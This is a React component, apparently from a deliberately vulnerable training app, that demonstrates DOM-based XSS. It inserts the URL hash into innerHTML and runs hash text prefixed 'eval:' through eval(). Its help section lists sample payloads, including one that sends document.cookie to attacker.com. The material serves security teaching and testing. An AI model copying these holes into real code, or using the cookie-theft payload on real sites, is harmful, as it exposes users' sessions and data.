import React, { useEffect, useState } from 'react';
import { AlertTriangle, Hash } from 'lucide-react';

function DOMXSS() {
  const [hashContent, setHashContent] = useState('');
  const [userInput, setUserInput] = useState('');

  useEffect(() => {
    // Function to read and process hash content
    const processHash = () => {
      const hash = window.location.hash.substring(1); // Remove the # symbol
      if (hash) {
        setHashContent(decodeURIComponent(hash));
        // VULNERABILITY: Direct DOM manipulation without sanitization
        const contentDiv = document.getElementById('hash-content');
        if (contentDiv) {
          contentDiv.innerHTML = decodeURIComponent(hash);
        }
      }
    };

    // Process hash on component mount
    processHash();

    // Listen for hash changes
    const handleHashChange = () => {
      processHash();
    };

    window.addEventListener('hashchange', handleHashChange);
    
    return () => {
      window.removeEventListener('hashchange', handleHashChange);
    };
  }, []);

  const updateHash = () => {
    // Update the URL hash with user input
    window.location.hash = encodeURIComponent(userInput);
  };

  const handleKeyPress = (e: React.KeyboardEvent) => {
    if (e.key === 'Enter') {
      updateHash();
    }
  };

  // Vulnerable function that processes URL fragments
  const processUrlFragment = () => {
    const fragment = window.location.hash.substring(1);
    if (fragment) {
      // VULNERABILITY: eval() with user-controlled input
      try {
        // This is extremely dangerous - never do this in real applications
        const decoded = decodeURIComponent(fragment);
        if (decoded.startsWith('eval:')) {
          eval(decoded.substring(5));
        }
      } catch (e) {
        console.error('Error processing fragment:', e);
      }
    }
  };

  useEffect(() => {
    processUrlFragment();
  }, [hashContent]);

  return (
    <div className="max-w-4xl mx-auto">
      <div className="bg-white rounded-lg shadow-md p-8">
        <div className="flex items-center mb-6">
          <AlertTriangle className="w-8 h-8 text-orange-500 mr-3" />
          <h2 className="text-3xl font-bold text-gray-800">DOM-based XSS Testing</h2>
        </div>

        <div className="bg-orange-50 border-l-4 border-orange-400 p-4 mb-8">
          <div className="flex items-center">
            <AlertTriangle className="w-5 h-5 text-orange-400 mr-2" />
            <p className="text-orange-700 font-medium">
              This page is intentionally vulnerable to DOM-based XSS attacks for educational purposes.
            </p>
          </div>
        </div>

        <div className="space-y-8">
          {/* Hash Fragment Section */}
          <div className="bg-gray-50 p-6 rounded-lg">
            <h3 className="text-xl font-semibold mb-4 text-gray-800">URL Fragment Processing</h3>
            <p className="text-gray-600 mb-4">
              Enter content that will be added to the URL hash and processed by client-side JavaScript.
            </p>
            
            <div className="flex gap-3 mb-4">
              <div className="flex-1">
                <input
                  type="text"
                  value={userInput}
                  onChange={(e) => setUserInput(e.target.value)}
                  onKeyPress={handleKeyPress}
                  className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-orange-500 focus:border-orange-500"
                  placeholder="Try: <img src=x onerror=alert('DOM XSS')>"
                />
              </div>
              <button
                onClick={updateHash}
                className="bg-orange-600 text-white px-6 py-3 rounded-lg hover:bg-orange-700 transition-colors flex items-center gap-2"
              >
                <Hash className="w-4 h-4" />
                Update Hash
              </button>
            </div>

            <div className="text-sm text-gray-600">
              <strong>Current URL:</strong> <code className="bg-gray-200 px-2 py-1 rounded break-all">{window.location.href}</code>
            </div>
          </div>

          {/* Content Display - Vulnerable to DOM XSS */}
          {hashContent && (
            <div className="bg-blue-50 p-6 rounded-lg">
              <h3 className="text-xl font-semibold mb-4 text-gray-800">Processed Content</h3>
              <div className="bg-white p-4 rounded border">
                <p className="text-gray-700 mb-2">Content from URL hash:</p>
                {/* VULNERABILITY: Direct innerHTML injection */}
                <div 
                  id="hash-content"
                  className="font-mono bg-gray-100 p-3 rounded text-sm min-h-[50px]"
                />
              </div>
            </div>
          )}

          {/* Advanced DOM XSS Section */}
          <div className="bg-red-50 p-6 rounded-lg">
            <h3 className="text-xl font-semibold mb-4 text-red-800">Advanced DOM XSS (eval)</h3>
            <p className="text-red-700 mb-4">
              This section demonstrates an extremely dangerous vulnerability where URL fragments starting with "eval:" are executed as JavaScript code.
            </p>
            <div className="bg-white p-4 rounded border">
              <p className="text-sm text-gray-600 mb-2">Try adding this to the URL hash:</p>
              <code className="bg-gray-200 px-2 py-1 rounded text-sm">eval:alert('Dangerous DOM XSS via eval!')</code>
            </div>
          </div>

          {/* Educational Information */}
          <div className="bg-yellow-50 p-6 rounded-lg">
            <h3 className="text-xl font-semibold mb-4 text-gray-800">How to Test DOM-based XSS</h3>
            <div className="space-y-3 text-gray-700">
              <p><strong>Basic Payload:</strong> <code className="bg-gray-200 px-2 py-1 rounded">&lt;img src=x onerror=alert('DOM XSS')&gt;</code></p>
              <p><strong>Script Tag:</strong> <code className="bg-gray-200 px-2 py-1 rounded">&lt;script&gt;alert('DOM XSS')&lt;/script&gt;</code></p>
              <p><strong>Event Handler:</strong> <code className="bg-gray-200 px-2 py-1 rounded">&lt;svg onload=alert('DOM XSS')&gt;</code></p>
              <p><strong>Eval Payload:</strong> <code className="bg-gray-200 px-2 py-1 rounded">eval:document.body.style.backgroundColor='red'</code></p>
              <p><strong>Data Exfiltration:</strong> <code className="bg-gray-200 px-2 py-1 rounded">eval:fetch('//attacker.com?cookie='+document.cookie)</code></p>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

export default DOMXSS;